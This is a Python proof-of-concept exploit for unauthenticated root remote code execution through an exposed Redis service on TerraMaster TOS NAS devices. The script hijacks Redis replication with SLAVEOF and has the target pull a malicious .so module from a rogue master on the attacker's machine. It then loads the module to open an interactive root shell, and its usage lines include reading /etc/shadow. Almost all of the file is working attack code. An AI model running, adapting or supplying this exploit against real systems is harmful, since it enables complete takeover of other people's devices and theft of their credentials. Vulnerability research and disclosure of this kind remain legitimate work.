#!/usr/bin/env python3
"""
TerraMaster TOS Redis unauthenticated root RCE POC

Exploits Redis 4.0.10 running as root, bound to 0.0.0.0:6379 with no
authentication on TOS3_A1.0 4.2.41 (RTD1296).

The config file (/etc/redis.conf with "bind 127.0.0.1") is ignored because
the init script starts redis as "redis-server *:6379" without referencing it.

Attack chain (requires only network access to port 6379):
  a) Use CONFIG SET to point dir/dbfilename at a writable location.
  b) Use SLAVEOF to make target replicate from a rogue master we emulate.
  c) Rogue master sends the compiled Redis module (.so) as the RDB payload.
  d) Redis writes the payload to disk verbatim.
  e) MODULE LOAD the .so, execute arbitrary commands as root.

No NFS, SSH, or credentials required — only port 6379.

Usage:
    python3 poc.py <NAS_IP>                          # interactive root shell
    python3 poc.py <NAS_IP> --cmd "id"               # single command
    python3 poc.py <NAS_IP> --cmd "cat /etc/shadow"
Requires module.so (run `make` to build it).
"""

import argparse
import os
import random
import socket
import string
import sys
import time

REDIS_PORT = 6379
MODULE_DROP_DIR = "/tmp"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))


# ---------------------------------------------------------------------------
# Progress bar — logs scroll above, bar sticks to the bottom
# ---------------------------------------------------------------------------

class Progress:
    """Single-line progress bar on stderr. Logs print above it."""

    def __init__(self, total, width=36):
        self.total = total
        self.width = width
        self.step = 0
        self.msg = ""
        self.tty = sys.stderr.isatty()

    def update(self, step, msg=""):
        self.step = step
        self.msg = msg
        if self.tty:
            self._draw()

    def _draw(self):
        filled = int(self.width * self.step / self.total)
        bar = "\033[36m" + "━" * filled + "\033[90m" + "╌" * (self.width - filled) + "\033[0m"
        pct = self.step * 100 // self.total
        sys.stderr.write(f"\033[2K\r  {bar} {pct:3d}%  {self.msg}")
        sys.stderr.flush()

    def clear(self):
        if self.tty:
            sys.stderr.write("\033[2K\r")
            sys.stderr.flush()

    def finish(self):
        self.step = self.total
        if self.tty:
            filled = self.width
            bar = "\033[32m" + "━" * filled + "\033[0m"
            sys.stderr.write(f"\033[2K\r  {bar} 100%  done\n")
            sys.stderr.flush()


_progress = None


def _log(prefix, msg):
    if _progress:
        _progress.clear()
    sys.stderr.write(f"{prefix} {msg}\n")
    sys.stderr.flush()
    if _progress and _progress.step < _progress.total:
        _progress._draw()


def bail(msg):
    if _progress:
        _progress.clear()
    sys.stderr.write(f"\n\033[31m[FATAL]\033[0m {msg}\n")
    sys.exit(1)


def info(msg):
    _log("\033[90m[*]\033[0m", msg)


def good(msg):
    _log("\033[32m[+]\033[0m", msg)


def warn(msg):
    _log("\033[33m[!]\033[0m", msg)


# ---------------------------------------------------------------------------
# Redis helpers
# ---------------------------------------------------------------------------

def redis_connect(host, port=REDIS_PORT, timeout=5):
    return socket.create_connection((host, port), timeout=timeout)


def redis_cmd(sock, *args):
    parts = [f"*{len(args)}\r\n"]
    for a in args:
        s = str(a)
        parts.append(f"${len(s)}\r\n{s}\r\n")
    sock.sendall("".join(parts).encode())
    time.sleep(0.3)
    data = b""
    sock.settimeout(2)
    while True:
        try:
            chunk = sock.recv(65536)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
    return data.decode(errors="replace")


def redis_config_get(sock, key):
    resp = redis_cmd(sock, "CONFIG", "GET", key)
    lines = resp.split("\r\n")
    if len(lines) >= 5:
        return lines[4]
    return None


# ---------------------------------------------------------------------------
# Rogue Redis master (replication payload delivery)
# ---------------------------------------------------------------------------

def get_local_ip(target_host, target_port=REDIS_PORT):
    s = socket.create_connection((target_host, target_port), timeout=5)
    ip = s.getsockname()[0]
    s.close()
    return ip


def random_drop_name():
    tag = ''.join(random.choices(string.ascii_lowercase, k=8))
    return f".{tag}.so"


def handle_repl_handshake(conn, payload):
    """Speak just enough RESP to complete a FULLRESYNC and deliver payload."""
    conn.settimeout(10)
    while True:
        data = conn.recv(4096)
        if not data:
            raise ConnectionError("slave disconnected during handshake")
        text = data.decode(errors="replace").strip()
        if "PSYNC" in text or "SYNC" in text:
            info(f"  <- {text.splitlines()[0][:60]}")
            info(f"  -> FULLRESYNC ({len(payload)} bytes)")
            conn.sendall(f"+FULLRESYNC {'Z' * 40} 1\r\n".encode())
            conn.sendall(f"${len(payload)}\r\n".encode())
            conn.sendall(payload)
            conn.sendall(b"\r\n")
            time.sleep(2)
            return
        elif "PING" in text:
            info("  <- PING")
            info("  -> PONG")
            conn.sendall(b"+PONG\r\n")
        else:
            first_line = text.splitlines()[0] if text else "(empty)"
            info(f"  <- {first_line[:60]}")
            info("  -> OK")
            conn.sendall(b"+OK\r\n")


def deliver_module(host, payload_bytes, lhost=None):
    """Deliver .so binary to target filesystem via Redis replication."""
    _progress.update(1, "Connecting to Redis")
    info(f"Connecting to {host}:{REDIS_PORT}")
    sock = redis_connect(host)
    drop_name = random_drop_name()
    drop_path = f"{MODULE_DROP_DIR}/{drop_name}"

    if lhost is None:
        lhost = get_local_ip(host)

    _progress.update(2, "Configuring drop location")
    orig_dir = redis_config_get(sock, "dir")
    orig_dbfilename = redis_config_get(sock, "dbfilename")
    info(f"Saved config: dir={orig_dir} dbfilename={orig_dbfilename}")

    resp = redis_cmd(sock, "CONFIG", "SET", "dir", MODULE_DROP_DIR)
    if "+OK" not in resp:
        bail(f"CONFIG SET dir failed: {resp.strip()}")
    resp = redis_cmd(sock, "CONFIG", "SET", "dbfilename", drop_name)
    if "+OK" not in resp:
        bail(f"CONFIG SET dbfilename failed: {resp.strip()}")
    info(f"Configured drop: dir={MODULE_DROP_DIR} dbfilename={drop_name}")

    _progress.update(3, "Starting rogue master")
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_sock.bind(("0.0.0.0", 0))
    listen_sock.listen(1)
    lport = listen_sock.getsockname()[1]
    listen_sock.settimeout(15)
    info(f"Listening on {lhost}:{lport}")

    _progress.update(4, "Waiting for slave to connect")
    info(f"SLAVEOF {lhost} {lport}")
    redis_cmd(sock, "SLAVEOF", lhost, str(lport))

    conn, addr = listen_sock.accept()
    info(f"Slave connected from {addr[0]}:{addr[1]}")

    _progress.update(5, "Replication handshake")
    handle_repl_handshake(conn, payload_bytes)
    conn.close()
    listen_sock.close()
    good(f"Payload written to {drop_path}")

    _progress.update(6, "Restoring config")
    info("SLAVEOF NO ONE")
    redis_cmd(sock, "SLAVEOF", "NO", "ONE")

    if orig_dir:
        redis_cmd(sock, "CONFIG", "SET", "dir", orig_dir)
    if orig_dbfilename:
        redis_cmd(sock, "CONFIG", "SET", "dbfilename", orig_dbfilename)
    info(f"Restored config: dir={orig_dir} dbfilename={orig_dbfilename}")

    sock.close()
    return drop_path



# ---------------------------------------------------------------------------
# Redis RCE via MODULE LOAD
# ---------------------------------------------------------------------------

def redis_load_module(host, module_path):
    """Connect, verify no auth, load module. Returns the live socket."""
    _progress.update(7, "Loading module")
    info(f"Connecting to {host}:{REDIS_PORT}")
    try:
        sock = redis_connect(host)
    except (OSError, socket.timeout) as e:
        bail(f"Cannot connect to Redis: {e}")

    resp = redis_cmd(sock, "PING")
    if "+PONG" not in resp:
        bail(f"Redis requires auth or rejected PING: {resp.strip()[:200]}")
    good("PONG — no authentication")

    resp = redis_cmd(sock, "INFO", "server")
    for key in ("redis_version", "os", "process_id", "tcp_port"):
        for line in resp.splitlines():
            if line.startswith(f"{key}:"):
                info(f"  {line.strip()}")

    info(f"MODULE LOAD {module_path}")
    resp = redis_cmd(sock, "MODULE", "LOAD", module_path)
    if "ERR" in resp and "already loaded" not in resp.lower():
        bail(f"MODULE LOAD failed: {resp.strip()}")
    good("system.exec available")

    _progress.finish()
    return sock


def redis_exec(sock, cmd):
    """Execute a command via system.exec and return output."""
    resp = redis_cmd(sock, "system.exec", cmd)
    output = resp.strip()
    if output.startswith("+"):
        output = output[1:]
    return output


def redis_cleanup(sock, module_path):
    """Remove .so from disk and unload module."""
    try:
        redis_exec(sock, f"rm -f {module_path}")
    except (BrokenPipeError, OSError):
        pass
    try:
        redis_cmd(sock, "MODULE", "UNLOAD", "system")
    except (BrokenPipeError, OSError):
        pass
    try:
        sock.close()
    except OSError:
        pass


# ---------------------------------------------------------------------------
# Interactive shell
# ---------------------------------------------------------------------------

def shell(sock, host):
    """Interactive root shell over Redis system.exec."""
    warn(f"root shell on {host} via Redis — type 'exit' or Ctrl-D to quit")
    while True:
        try:
            cmd = input(f"\x1b[1;31mroot@{host}\x1b[0m# ")
        except (EOFError, KeyboardInterrupt):
            print()
            break
        cmd = cmd.strip()
        if not cmd:
            continue
        if cmd in ("exit", "quit"):
            break
        output = redis_exec(sock, cmd)
        if output:
            print(output)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _progress

    parser = argparse.ArgumentParser(
        description="TerraMaster TOS Redis -> unauthenticated root RCE"
    )
    parser.add_argument("host", help="NAS IP address")
    parser.add_argument("--cmd", default=None,
                        help="Single command (default: interactive shell)")
    parser.add_argument("--lhost", default=None,
                        help="Attacker IP reachable from target (default: auto)")
    args = parser.parse_args()

    _progress = Progress(total=8)

    module_so = os.path.join(SCRIPT_DIR, "module.so")
    if not os.path.isfile(module_so):
        bail(f"{module_so} not found. Run 'make' to build it.")
    payload = open(module_so, "rb").read()
    info(f"Loaded {module_so} ({len(payload)} bytes)")
    module_on_target = deliver_module(args.host, payload, lhost=args.lhost)
    sock = redis_load_module(args.host, module_on_target)

    if args.cmd:
        output = redis_exec(sock, args.cmd)
        if output:
            print(output)
        else:
            warn("No output.")
    else:
        shell(sock, args.host)

    info("Cleaning up")
    redis_cleanup(sock, module_on_target)
    good("Done")

    return 0


if __name__ == "__main__":
    sys.exit(main())
